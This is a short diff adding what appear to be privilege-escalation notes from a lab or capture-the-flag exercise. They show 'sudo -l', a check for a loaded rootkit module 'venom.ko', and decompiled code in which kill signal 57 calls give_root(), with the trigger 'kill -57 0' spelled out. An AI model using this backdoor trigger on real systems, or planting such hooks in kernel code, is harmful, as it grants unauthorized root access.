@@ -1,0 +1,16 @@
+
+
+sudo -l
+
+command execute
+
+lsmod | grep venom.ko
+
+__fentry__();
+  plVar2 = module_previous;
+  iVar3 = (int)pt_regs->si;
+  if (iVar3 == 0x39) {    0x39 => 57  kill -57 0 => root access
+    give_root();
+    iVar3 = __x86_return_thunk();
+    return iVar3;
+
